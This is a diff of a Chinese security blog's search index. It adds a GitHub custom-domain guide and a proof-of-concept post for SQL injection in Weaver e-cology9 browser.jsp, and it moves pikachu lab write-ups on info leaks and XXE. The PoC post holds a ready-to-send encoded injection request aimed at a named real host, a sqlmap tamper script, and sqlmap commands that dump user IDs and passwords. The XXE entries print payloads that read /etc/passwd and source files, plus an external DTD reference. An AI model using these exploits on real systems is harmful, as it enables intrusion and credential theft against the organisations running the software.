@@ -1,6 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>github绑定个人域名</title>
+    <url>/2023/05/05/ForGithub/github%E7%BB%91%E5%AE%9A%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D/</url>
+    <content><![CDATA[<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p><a href="https://www.godaddy.com/zh-sg">域名注册购买,云服务器,建站,企业邮箱和网站安全-GoDaddy官方中文站</a></p>
+<p>该站点可以用支付宝支付</p>
+<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>进去后更改币种为人名币</p>
+<p>除了域名啥都不买</p>
+<p>不一定要.com</p>
+<h2 id="CNAME"><a href="#CNAME" class="headerlink" title="CNAME"></a>CNAME</h2><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub.example.com. IN CNAME hoge.example.com</span><br></pre></td></tr></table></figure>
+
+<p>解释：【別名】 IN CNAME 【原名】</p>
+<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>给某一个domain起多个名字。</p>
+<p>类似于，jd.com,jd360.com,jingdong.com虽然是不同名字的域名，但是可以指向同一个原名jd.com。可以让企业的对外展示更加灵活。</p>
+<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jd360.com IN CNAME jd.com</span><br><span class="line"></span><br><span class="line">jingdong.com IN CNAME jd.com</span><br><span class="line"></span><br><span class="line">jd.com IN A 123.123.123.123 （这条是A记录例子）</span><br></pre></td></tr></table></figure>
+
+<h5 id="dns配置示例"><a href="#dns配置示例" class="headerlink" title="dns配置示例"></a>dns配置示例</h5><p>其中blog是子域名，值指向github的blog的URL</p>
+<p><img src="/images/image-20230505085456157.png" alt="image-20230505085456157"></p>
+<p>然后等待生效即可</p>
+<h2 id="github配置"><a href="#github配置" class="headerlink" title="github配置"></a>github配置</h2><p>上述域名的CNAME配置完成后，页面还不能加载出内容</p>
+<p><img src="/images/image-20230505090035377.png" alt="image-20230505090035377"></p>
+<p>需要在github中再进行一部分配置</p>
+<p>进入仓库的setting</p>
+<p><img src="/images/image-20230505090629790.png" alt="image-20230505090629790"></p>
+<p>在page设置中添加domain</p>
+<p><img src="/images/image-20230505090611227.png" alt="image-20230505090611227"></p>
+<p>校验完成后等待一会即可</p>
+<p><img src="/images/image-20230505090741056.png" alt="image-20230505090741056"></p>
+]]></content>
+      <categories>
+        <category>ForGithub</category>
+      </categories>
+  </entry>
+  <entry>
     <title>使用github搭建个人博客</title>
     <url>/2023/05/04/ForGithub/%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html#%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93</a></p>
@@ -343,6 +375,42 @@
       </categories>
   </entry>
   <entry>
+    <title>泛微e-cology9 browser.jsp SQL注入</title>
+    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
+
+<p>sql语句经过了三层全字符的url编码</p>
+<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
+<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
+<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
+]]></content>
+      <categories>
+        <category>POC</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-CSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/CSRF/</url>
     <content><![CDATA[<h1 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h1><p>CSRF(Cross-Site Request Forgery)跨站请求伪造</p>
@@ -434,24 +502,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-敏感信息泄露</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
-    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
-<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
-<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
-<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
-<p>成功登录</p>
-<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
-<p>并且发现，该后台为未授权接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
-
-<p>不需要登录也能访问</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-RCE</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
     <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
@@ -507,60 +557,18 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-XXE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
-    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
-<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
-<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
-<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-敏感信息泄露</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/IcanseeyourABC/</url>
+    <content><![CDATA[<p>敏感信息泄露涉及很多方面</p>
+<p>未授权接口，网站源码，用户名密码泄露等都可以归为敏感信息泄露</p>
+<h3 id="find-abc"><a href="#find-abc" class="headerlink" title="find abc"></a>find abc</h3><p>该题查看网站源码可以看到泄露的测试账号</p>
+<p><img src="/images/image-20230110143848742.png" alt="image-20230110143848742"></p>
+<p>成功登录</p>
+<p><img src="/images/image-20230110144000741.png" alt="image-20230110144000741"></p>
+<p>并且发现，该后台为未授权接口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure>
 
-<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
-<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
-<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
-
-<p>不止这些，不同的语言支持的协议不同</p>
-<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
-<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>DTD实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XML实例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
-<p>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
-<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
-<p>则可能存在XXE漏洞</p>
-<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
+<p>不需要登录也能访问</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -627,6 +635,66 @@
 
 <p>查看页面源代码</p>
 <p><img src="/images/image-20230110163139174.png" alt="image-20230110163139174"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-XXE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/XXE/</url>
+    <content><![CDATA[<h2 id="xml外部实体注入漏洞"><a href="#xml外部实体注入漏洞" class="headerlink" title="xml外部实体注入漏洞"></a>xml外部实体注入漏洞</h2><p>攻击者通过向服务器注入指定的xml实体内容，从而让服务器按照指定的配置进行执行</p>
+<p>也就是说服务端接收和解析了来自用户端的xml数据，而又没有做严格的安全控制，从而导致xml外部实体注入。</p>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h2 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h2><p>xml是一种类似html的树形结构，用于数据的传输和存储</p>
+<h5 id="一个xml文档实例"><a href="#一个xml文档实例" class="headerlink" title="一个xml文档实例"></a>一个xml文档实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+
+<h5 id="XML声明部分-版本号与编码"><a href="#XML声明部分-版本号与编码" class="headerlink" title="XML声明部分(版本号与编码)"></a>XML声明部分(版本号与编码)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding==&quot;ISO-8859-1&quot;?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="文档类型定义-DTD"><a href="#文档类型定义-DTD" class="headerlink" title="文档类型定义(DTD)"></a>文档类型定义(DTD)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文档类型定义(DTD)部分用来为XML文档定义语法约束，可以是内部声明也可以用来引用外部DTD。</p>
+<p>XML中对数据的引用称为实体，实体中有一类叫外部实体，用于引入外部资源，有SYSTEM(本地)与PUBLIC(公用)两个关键词。</p>
+<h5 id="文档元素"><a href="#文档元素" class="headerlink" title="文档元素"></a>文档元素</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体的引用可以借助如下协议"><a href="#外部实体的引用可以借助如下协议" class="headerlink" title="外部实体的引用可以借助如下协议"></a>外部实体的引用可以借助如下协议</h5><p>有点像php的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///绝对路径</span><br><span class="line">http(s)://URL</span><br><span class="line">php://filter/read=convert.base64-encode/resource=绝对或相对路径</span><br></pre></td></tr></table></figure>
+
+<p>不止这些，不同的语言支持的协议不同</p>
+<p><img src="/images/image-20230110150940112.png" alt="image-20230110150940112"></p>
+<h2 id="重点介绍实体声明"><a href="#重点介绍实体声明" class="headerlink" title="重点介绍实体声明"></a>重点介绍实体声明</h2><h5 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe  &quot;sec test&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h5><p>外部实体引用支持通过协议，来动态的获取值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML实例</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件，或可输入xml的位置</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY name &quot;my name is nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
+<p><img src="/images/image-20230110151826362.png" alt="image-20230110151826362"></p>
